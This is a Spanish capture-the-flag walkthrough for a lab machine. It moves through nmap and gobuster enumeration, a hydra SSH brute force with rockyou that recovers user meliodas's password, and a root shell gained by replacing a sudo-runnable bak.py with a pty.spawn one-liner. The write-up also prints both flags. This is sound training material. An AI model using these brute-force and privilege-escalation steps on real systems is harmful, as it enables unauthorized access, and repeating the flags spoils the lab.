# 1) Objetivo

En esta maquina hay que conseguir acceso a user.txt y root.txt y adjuntar la flag encontrada en cada archivo.

# 2) Reconocimiento y obtener acceso

Lo primero que hacemos es un escaneo nmap para conocer los puertos abiertos y los servicios, vamos a ejecutar el siguiente comando:

```
nmap -sV -T4 10.10.96.208
```

![](IMG/Pasted%20image%2020250301012025.png)

Vemos que la maquina tiene dos puertos abiertos, uno es el ssh y el otro es el http, ya que ssh es mas seguro por defecto y que http suele ser mas inseguro, intentaremos primero con este.

como hicimos en el ejercicio anterior (Blaster), vamos a ejecutar gobuster para listar los directorios de la web y ver que encontramos. Ejecutamos una busqueda sencilla, con el comando siguiente:

```
gobuster dir -u http://10.10.96.208 -w /usr/share/wordlists/dirb/common.txt
```

![](IMG/Pasted%20image%2020250301012618.png)

lo primero que haremos, sera mirar el archivo robots.txt, por si hubiera algo interesante.

![](IMG/Pasted%20image%2020250301012850.png)

Se hace referencia a "rockyou", puede referirse al diccionario de contraseñas, así que lo tendremos en cuenta por si encontramos algo mas.

Miraremos ahora la pagina web y seguimos buscando.

La pagina web no tiene gran cosa, esta llena de Lorem ipsums y poco mas... lo único interesante es el nombre de un usuario que ha realizado un post, "meliodas", y el de las personas que han realizado comentarios, tenemos tres, root, www-data y Anonymous

![](IMG/Pasted%20image%2020250301013332.png)
![](IMG/Pasted%20image%2020250301013147.png)

Y poco mas, he probado a mirar en otras secciones de la web, pero no son accesibles, ni el enlace a About, ni a Archives ni contact.

![](IMG/Pasted%20image%2020250301013716.png)

Y en el formulario de abajo, ni siquiera nos deja hacer comentarios, así que de momento no se puede hacer nada mas, o yo no he sabido encontrarlo.

Así que vamos a intentar acceder por ssh haciendo fuerza bruta usando el diccionario rockyou al que creo que se hace referencia en robots.txt

Le hago un ataque por fuerza bruta usando el usuario meliodas (ya que es el que ha posteado y debe estar registrado) con el diccionario rockyou usando hydra, ejecutamos:

```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.96.208
```

![](IMG/Pasted%20image%2020250301014446.png)

Pues hemos conseguido la contraseña del usuario meliodas, es iloveyou1, así que vamos a acceder por ssh con las credenciales.

```
ssh meliodas@10.10.96.208
```

![](IMG/Pasted%20image%2020250301014827.png)

Una vez conectados, listaremos el contenido.

```
ls
```

![](IMG/Pasted%20image%2020250301014932.png)

Una vez listado el contenido, hemos encontrado el archivo user.txt, el cual si lo abrimos

```
cat user.txt
```

Encontramos el código de resultado.

**user.txt: 6d488cbb3f111d135722c33cb635f4ec**

# 3) Escalar privilegios

Ya tenemos acceso con el usuario meliodas, ahora, trataremos de escalar privilegios. 

Comenzamos listando los permisos sudo (si los tuviera) de nuestro usuario en la maquina. Para eso ejecutamos:

```
sudo -l
```

![](IMG/Pasted%20image%2020250301020856.png)

Vemos que el usuario tiene permisos para ejecutar python y para ejecutar un archivo llamado bak.py que se encuentra en su directorio home.

Trataremos por tanto de modificar ese archivo para escalar privilegios.
Como el archivo es propiedad del usuario root, no podemos modificarlo, al no poder sobreescribirlo.

```
nano bak.py
```

![](IMG/Pasted%20image%2020250301021208.png)

Pero como el archivo se encuentra en nuestro home, si podemos borrarlo y crear uno con el mismo nombre.

```
rm bak.py
```

![](IMG/Pasted%20image%2020250301021313.png)

Y creamos otro archivo con el mismo nombre, en el que escribimos el siguiente codigo:

```
#!/usr/bin/env python
import pty; pty.spawn("/bin/bash")
```

![](IMG/Pasted%20image%2020250301021517.png)

Este codigo, nos va a generar una shell root, la podemos ejecutar así:

```
sudo /usr/bin/python3 /home/meliodas/bak.py
```

y tras ejecutarlo, si hacemos whoami (aunque ya lo vemos en el prompt "root@ubuntu"), veremos que somos root.

![](IMG/Pasted%20image%2020250301021814.png)

Y ahora, si accedemos al directorio de root y listamos su contenido, veremos el archivo root.txt.

```
cd /root
ls
```

![](IMG/Pasted%20image%2020250301022012.png)

si lo abrimos, veremos el código de respuesta.

```
cat root.txt
```

![](IMG/Pasted%20image%2020250301022058.png)

**root.txt: e8c8c6c256c35515d1d344ee0488c617**